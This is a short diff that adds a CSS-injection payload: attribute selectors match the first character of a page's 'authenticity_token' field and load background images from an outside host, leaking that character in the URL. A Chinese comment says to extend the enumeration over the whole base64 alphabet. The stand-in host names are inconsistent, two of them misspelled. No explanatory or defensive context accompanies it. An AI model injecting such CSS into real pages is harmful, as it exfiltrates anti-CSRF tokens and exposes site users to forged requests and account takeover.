@@ -1,0 +1,12 @@
+<style>
+input[name="authenticity_token"][value^="a"] {
+  background: url(https://exmaple.com/leak?char=a);
+}
+input[name="authenticity_token"][value^="b"] {
+  background: url(https://examle.com/leak?char=b);
+}
+input[name="authenticity_token"][value^="c"] {
+  background: url(https://example.com/leak?char=c);
+}
+/* 继续枚举 a-z, A-Z, 0-9, +, /, = */
+</style>
